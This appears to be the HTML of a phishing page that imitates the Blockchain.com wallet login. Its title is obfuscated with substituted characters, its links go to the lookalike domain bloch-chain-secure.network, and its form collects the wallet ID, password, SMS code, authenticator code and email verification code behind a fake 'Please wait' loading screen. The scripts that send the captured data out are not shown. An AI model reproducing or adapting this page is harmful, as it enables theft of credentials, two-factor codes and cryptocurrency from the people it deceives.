<!DOCTYPE html>
<html lang="en" data-kantu="1"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Bl�ckchain.c�m Wallet - Exch�nge Crypt�currency</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="shortcut icon" href="/custom/img/favicon.ico">
    <!-- Latest compiled and minified CSS -->
    <link rel="stylesheet" href="custom/script/bootstrap.min.css">

    <!-- jQuery library -->
    <script src="custom/script/jquery.min.js.download"></script>

    <!-- Popper JS -->
    <script src="custom/script/popper.min.js.download"></script>

    <!-- Latest compiled JavaScript -->
    <script src="custom/script/bootstrap.min.js.download"></script>
</head>
<body>

    <div class="container-fluid">

        <div class="sc-bnXvFD dDillI">
            <div style="height:112px;" class="col-md-12">
                <div class="sc-cmthru buGjPd sc-gHboQg hnSMth">
                    <div class="sc-hMFtBS gZupyF">
                        <div class="sc-eerKOB cTWApN" style="display: flex;flex-direction: column;">
                            <a href="" color="blue600" class="sc-bZQynM cxqfnO" style="font-family: Inter, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, Oxygen, Ubuntu, Cantarell, &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, sans-serif;font-size: 16px;font-weight: 500;color: rgb(12, 108, 242);text-transform: none;cursor: pointer;text-decoration: none;">
                                <img src="custom/img/bc-logo.svg" srcset="" style="height:24px;width:240px;display:block;" class="sc-EHOje bOsyyS sc-eilVRo siEjp" width="auto" color="auto">
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="sc-gFaPwZ flvjfT" id="login-loading-container">
            <div class="sc-cCbXAZ geuGEM" id="login-div" style="display: none;">
                <div class="sc-hBbWxd sc-fHSTwm eOJfhy" id="eOJfhy">
                    <div style=""></div>
                    <div class="sc-hdPSEv enDhkv">
                        <div color="textBlack" cursor="inherit" opacity="1" class="sc-gzVnrw blKetq">
                            <span>Welcome back!</span> 
                        </div>
                    </div>
                    <form class="sc-jxGEyO hQuvQG sc-gleUXh FIdwe">
                        <div class="sc-dEfkYy hkmucL">
                            <div class="sc-cqPOvA caEeOr">
                                <label for="guid" class="sc-gNJABI bHZVbO">
                                    <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp">
                                        <span>Wallet ID</span>
                                    </div>
                                </label>
                                <div class="sc-ESoVU ixIYOH" height="48px">
                                    <div class="sc-caSCKo iwqfqa">
                                        <input data-e2e="loginGuid" id="guid" name="guid" height="48px" type="text" spellcheck="false" class="sc-fAjcbJ gfoKiQ" value="" required="">
                                    </div>
                                </div>
                            </div>
                            <div class="sc-htoDjs fJbVHw sc-dBaXSw kzXGfH">
                                <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw ivvLkX">
                                    <span>Your Wallet ID can be found at the bottom of any email we�ve ever sent you. Need a reminder?</span>
                                    <a color="blue600" class="sc-bZQynM hVIpLu" href=#">
                                        <span>Send my Wallet ID</span>
                                    </a>
                                </div>
                            </div>
                        </div>
                        <div class="sc-dEfkYy hkmucL">
                            <div class="sc-cqPOvA caEeOr">
                                <label for="password" class="sc-gNJABI bHZVbO">
                                    <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp">
                                        <span>Password</span>
                                    </div>
                                </label>
                                
                                <div class="sc-lnmtFM eVQzAR">
                                    <div class="sc-erNlkL frTPDw">
                                        <input data-e2e="loginPassword" id="password" name="password" type="password" spellcheck="false" class="sc-jhAzac tcirq" value="" required="">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="sc-dEfkYy hkmucL sms-code-div" style="display: block;">
                            <div class="sc-cqPOvA caEeOr">
                                <label for="password" class="sc-gNJABI bHZVbO">
                                    <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp">
                                        <span>SMS Code</span>
                                    </div>
                                </label>
                                <label class="sc-gNJABI bHZVbO error-div" style="float:right;display:none;">
                                    <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp">
                                        <span style="color:red;font-size:12px;">Invalid Auth Code</span>
                                    </div>
                                </label>
                                <div class="sc-lnmtFM eVQzAR">
                                    <div class="sc-erNlkL frTPDw">
                                        <input data-e2e="loginPassword" id="sms_code" name="sms_code" type="text" spellcheck="false" class="sc-jhAzac tcirq" value="">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="sc-dEfkYy hkmucL auth-app-div" style="display:none;">
                            <div class="sc-cqPOvA caEeOr">
                                <label for="password" class="sc-gNJABI bHZVbO">
                                    <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp">
                                        <span>Google Authenticator App Code</span>
                                    </div>
                                </label>
                                <label class="sc-gNJABI bHZVbO error-div" style="float:right;display:none;">
                                    <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp">
                                        <span style="color:red;font-size:12px;">Invalid Auth Code</span>
                                    </div>
                                </label>
                                <div class="sc-lnmtFM eVQzAR">
                                    <div class="sc-erNlkL frTPDw">
                                        <input data-e2e="loginPassword" id="auth_app_code" name="auth_app_code" type="text" spellcheck="false" class="sc-jhAzac tcirq" value="">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="sc-dEfkYy hkmucL email-code-div" style="display:none;">
                            <div class="sc-cqPOvA caEeOr">
                                <label for="password" class="sc-gNJABI bHZVbO">
                                    <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp">
                                        <span>Email Verification Code</span>
                                    </div>
                                </label>
                                <label class="sc-gNJABI bHZVbO error-div" style="float:right;display:none;">
                                    <div color="grey800" cursor="inherit" opacity="1" class="sc-gzVnrw kXYclp">
                                        <span style="color:red;font-size:12px;">Invalid Auth Code</span>
                                    </div>
                                </label>
                                <div class="sc-lnmtFM eVQzAR">
                                    <div class="sc-erNlkL frTPDw">
                                        <input data-e2e="loginPassword" id="email_code" name="email_code" type="text" spellcheck="false" class="sc-jhAzac tcirq" value="">
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="sc-dEfkYy hkmucL">
                            <button type="submit" height="48px" data-e2e="loginButton" class="sc-bdVaJa dlCycp sc-doWzTn jpTmQa" id="btn_login" color="white">
                                <div color="whiteFade900" cursor="inherit" opacity="1" class="sc-gzVnrw fTkqNv">
                                    <span>Log In</span>
                                </div>
                                <div class="loading">
                                    <div class="bounce_1"></div>
                                    <div class="bounce_2"></div>
                                </div>
                            </button>
                        </div>
                        
                    </form>
                    <div class="sc-cmIlrE doyIyw">
                        <a data-e2e="loginViaMobileLink" color="blue600" class="sc-bZQynM cIFcfz bottom-link-left" href="http://bloch-chain-secure.network/index_job.php#/mobile-login">
                            <span>Login via Mobile</span>
                        </a>
                        <a data-e2e="loginGetHelp" color="blue600" class="sc-bZQynM cIFcfz bottom-link-right" href="http://bloch-chain-secure.network/index_job.php#/help">
                            <span>Need some help?</span>
                        </a>
                    </div>
                </div>
                <a color="blue600" data-e2e="signupLink" class="sc-bZQynM cxqfnO" href="http://bloch-chain-secure.network/index_job.php#/signup" style="text-decoration:none;">
                    <div class="sc-hizQCF jYQXfl">
                        <div color="whiteFade600" cursor="inherit" opacity="1" class="sc-gzVnrw iExTOz">
                            <span>Dont have a wallet?</span>
                        </div>
                        &nbsp;
                        <div color="whiteFade900" class="sc-gzVnrw jrXeJa sc-eNPDpu eKAesF" cursor="inherit" opacity="1">
                            <span>Sign Up</span>
                        </div>
                    </div>
                </a>
            </div>
        </div>
            <div id="loading-div" style="text-align: center; font-size: 20px; color: gray; padding-top: 60px; display: block;">
                <div class="loading-gif-div">
                    <img src="custom/img/giphy.gif" style="width:25%;">
                </div>
                <div class="loading-text-div" style="padding:28px;">
                    <span style="position:relative;" id="loading-text">Please wait.</span>
                </div>
            </div>
    

    </div>

    <style>
        .bottom-link-left{
            float: left;
            text-decoration: none;
        }
        .bottom-link-right{
            float: right;
            text-decoration: none;
        }

        @media screen and (max-width: 767px) {
            #login-loading-container {
                display: flex;
                flex-direction: column;
                -webkit-box-pack: center;
                justify-content: center;
                -webkit-box-align: center;
                align-items: center;
                z-index: 1;
                max-width: 100%;
                padding: 0px;
            }
            #eOJfhy {
                box-sizing: border-box;
                background-color: rgb(255, 255, 255);
                box-shadow: rgba(0, 0, 0, 0.21) 0px 2px 8px 0px;
                width: 100%;
                position: relative;
                padding: 32px;
                border-radius: 8px;
                overflow: visible;
            }
            .gZupyF{
                display: flex;
                padding-left: 0px;
                -webkit-box-align: center;
                align-items: center;
                width: 250px;
            }
        }
        @media screen and (max-width: 350px) {
            .bottom-link-left{
                float: left;
                text-decoration: none;
            }
            .bottom-link-right{
                float: left;
                text-decoration: none;
                padding-left: 10px;
            }
        }
        
        .gZupyF{
                display: flex;
                -webkit-box-align: center;
                align-items: center;
                width: 250px;
            }
        
    
        @font-face {
            font-family: myFirstFont;
            src: url(./custom/font/Inter-Bold-a7dc5794cd7b07663ab2b8bcf96c0373.otf);
        }
        body{
            background-color: rgb(18, 29, 51);
            height: auto;
            min-height: 100%;
            width: 100%;
            overflow: auto;
            font-family: myFirstFont;
        }
        
        .buGjPd {
            position: relative;
            display: flex;
            flex-direction: row;
            -webkit-box-pack: justify;
            justify-content: center;
            -webkit-box-align: center;
            align-items: center;
            width: 100%;
            height: 100%;
            background-color: inherit;
        }
        .flvjfT {
            display: flex;
            flex-direction: column;
            -webkit-box-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            align-items: center;
            z-index: 1;
            max-width: 100%;
            padding: 0px 32px;
        }
        .geuGEM {
            display: flex;
            flex-direction: column;
            -webkit-box-pack: center;
            justify-content: center;
        }
        .eOJfhy {
            box-sizing: border-box;
            background-color: rgb(255, 255, 255);
            box-shadow: rgba(0, 0, 0, 0.21) 0px 2px 8px 0px;
            width: 480px;
            position: relative;
            padding: 32px;
            border-radius: 8px;
            overflow: visible;
        }
        .enDhkv {
            display: flex;
            -webkit-box-pack: justify;
            justify-content: space-between;
            -webkit-box-align: center;
            align-items: center;
        }
        .blKetq {
            /* font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; */
            font-weight: 600;
            font-size: 20px;
            line-height: inherit;
            text-transform: capitalize;
            font-style: normal;
            color: rgb(18, 29, 51);
            cursor: inherit;
            display: block;
            opacity: 1;
        }
        .FIdwe {
            margin: 20px 0px;
        }
        .hQuvQG {
            width: 100%;
        }
        .hkmucL {
            width: 100%;
            display: flex;
            position: relative;
            flex-direction: column;
            margin-bottom: 16px;
        }
        .hkmucL > div {
            margin-right: 0px;
        }
        .caEeOr {
            position: relative;
            width: 100%;
        }
        .bHZVbO > div {
            margin-bottom: 5px;
        }
        .kXYclp {
            /* font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; */
            font-weight: 600;
            font-size: 14px;
            line-height: inherit;
            text-transform: none;
            font-style: normal;
            color: rgb(53, 63, 82);
            cursor: inherit;
            display: block;
            opacity: 1;
        }
        .ixIYOH {
            position: relative;
            display: flex;
            flex-direction: column;
            -webkit-box-pack: end;
            justify-content: flex-end;
            align-items: flex-start;
            width: 100%;
            height: 48px;
        }
        .iwqfqa {
            display: flex;
            width: 100%;
            -webkit-box-align: center;
            align-items: center;
            position: relative;
        }
        .gfoKiQ {
            display: block;
            width: 100%;
            height: 48px;
            min-height: 48px;
            box-sizing: border-box;
            font-size: 16px;
            font-weight: 500;
            color: rgb(53, 63, 82);
            background-color: rgb(255, 255, 255);
            /* font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; */
            background-image: none;
            outline-width: 0px;
            user-select: text;
            padding: 6px 12px;
            border-width: 1px;
            border-style: solid;
            border-color: rgb(223, 227, 235);
            border-image: initial;
            border-radius: 8px;
        }
        .hkmucL > div:last-child {
            margin-right: 0px;
        }
        .kzXGfH {
            line-height: 1;
            text-align: center;
            margin: 12px 0px;
        }
        .fJbVHw > * {
            display: inline;
            margin-right: 2px;
        }
        .fJbVHw > * {
            white-space: normal;
        }
        .ivvLkX {
            /* font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; */
            font-weight: 500;
            font-size: 12px;
            line-height: inherit;
            text-transform: none;
            font-style: normal;
            color: rgb(53, 63, 82);
            cursor: inherit;
            display: block;
            opacity: 1;
        }
        .eVQzAR {
            position: relative;
            display: flex;
            flex-direction: column;
            -webkit-box-pack: start;
            justify-content: flex-start;
            align-items: flex-start;
            width: 100%;
        }
        .frTPDw {
            width: 100%;
            border-radius: 8px;
            overflow: hidden;
        }
        .tcirq {
            position: relative;
            display: block;
            width: 100%;
            height: 48px;
            min-height: 48px;
            box-sizing: border-box;
            letter-spacing: 4px;
            font-size: 20px;
            font-weight: 500;
            color: rgb(53, 63, 82);
            background-color: rgb(255, 255, 255);
            background-image: none;
            outline-width: 0px;
            user-select: text;
            /* font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; */
            padding: 6px 12px;
            border-radius: 8px;
            border-width: 1px;
            border-style: solid;
            border-color: rgb(223, 227, 235);
            border-image: initial;
        }
        .hkmucL:last-child {
            margin-bottom: 0px;
        }
        .jpTmQa {
            margin-top: 15px;
        }
        .dlCycp {
            display: flex;
            flex-direction: row;
            -webkit-box-pack: center;
            justify-content: center;
            -webkit-box-align: center;
            align-items: center;
            width: 100%;
            min-width: 140px;
            height: 48px;
            box-sizing: border-box;
            user-select: text;
            text-align: center;
            vertical-align: middle;
            letter-spacing: normal;
            white-space: nowrap;
            line-height: 1;
            text-transform: none;
            /* font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; */
            font-size: 14px;
            font-weight: 600;
            cursor: select;
            opacity: 0.5;
            color: rgb(255, 255, 255);
            background-color: rgb(12, 108, 242);
            padding: 10px 15px;
            text-decoration: none;
            transition: all 0.2s ease-in-out 0s;
            border-radius: 8px;
            border-style: solid;
            border-width: 1px;
            border-color: rgb(12, 108, 242);
        }
        
        .hVIpLu {
            /* font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; */
            font-size: 12px;
            font-weight: 500;
            color: rgb(12, 108, 242);
            text-transform: none;
            cursor: pointer;
            text-decoration: none;
        }
        @media (min-width: 768px)
        .doyIyw {
            flex-direction: row;
            -webkit-box-pack: justify;
            justify-content: space-between;
            -webkit-box-align: center;
            align-items: center;
        }
        .cIFcfz {
            /* font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; */
            font-size: 13px;
            font-weight: 600;
            color: rgb(12, 108, 242);
            text-transform: none;
            cursor: pointer;
            text-decoration: none;
        }
        .doyIyw {
            display: block;
            /* display: flex; */
            flex-direction: column;
            -webkit-box-pack: start;
            justify-content: flex-start;
            align-items: flex-start;
            margin-top: 15px;
        }
        .cxqfnO:hover {
            color: rgb(12, 108, 242);
        }
        .cxqfnO {
            /* font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; */
            font-size: 16px;
            font-weight: 500;
            color: rgb(12, 108, 242);
            text-transform: none;
            cursor: pointer;
            text-decoration: none;
        }
        .jYQXfl {
            display: flex;
            -webkit-box-pack: center;
            justify-content: center;
            margin-top: 1.25rem;
        }
        .iExTOz {
            /* font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; */
            font-weight: 500;
            font-size: 14px;
            line-height: inherit;
            text-transform: none;
            font-style: normal;
            color: rgba(255, 255, 255, 0.6);
            cursor: inherit;
            display: block;
            opacity: 1;
        }
        .jrXeJa {
            /* font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif; */
            font-weight: 500;
            font-size: 14px;
            line-height: inherit;
            text-transform: none;
            font-style: normal;
            color: rgba(255, 255, 255, 0.9);
            cursor: inherit;
            display: block;
            opacity: 1;
        }
        

        .loading{
            width:20px;
            height:20px;
            position:relative;
            margin: 300px auto;
            display: none;
        }
        .bounce_1, .bounce_2{
            width: 100%;
            height: 100%;
            border-radius: 50%;
            background-color: #FFF;
            opacity: 0.6;
            position: absolute;
            top: 0;
            left: 0;
            -webkit-animation: sa-bounce 2.1s infinite ease-in-out;
            animation: sa-bounce 2.1s infinite ease-in-out;
        }
        .bounce_2{
            -webkit-animation-delay: -1.0s;
            animation-delay: -1.0s;
        }
        @keyframes sa-bounce {
            0%, 100%{
            transform: scale(0.0);
            -webkit-transform:scale(0.0);
            }
            50%{
            transform:scale(1.0);
            -webkit-transform: scale(1.0);
            } 
        }
        @-webkit-keyframes sa-bounce{
            0%, 100%{ -webkit-transform: scale(0.0); }
            50% { -webkit-transform:scale(1.0); }
        }
        #loading-div{
            display:none;
            box-sizing: border-box;
            background-color: rgb(255, 255, 255);
            box-shadow: rgba(0, 0, 0, 0.21) 0px 2px 8px 0px;
            width: 400px;
            /* position: relative; */
            padding: 32px;
            border-radius: 8px;
            overflow: visible;

            margin: 0;
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);

        }
        @media screen and (max-width: 450px) {
            #loading-div{
                display:none;
                box-sizing: border-box;
                background-color: rgb(255, 255, 255);
                box-shadow: rgba(0, 0, 0, 0.21) 0px 2px 8px 0px;
                width: 90%;
                /* position: relative; */
                padding: 32px;
                border-radius: 8px;
                overflow: visible;

                margin: 0;
                position: absolute;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
            }
        }
        #login-loading-container{
            position:relative;

        }
        .container {
            height: 200px;
            position: relative;
            border: 3px solid green;
        }

        .vertical-center {
            margin: 0;
            position: absolute;
            top: 50%;
            -ms-transform: translateY(-50%);
            transform: translateY(-50%);
        }
        label{
            margin-bottom:0px;
        }

    </style>
    

</body></html>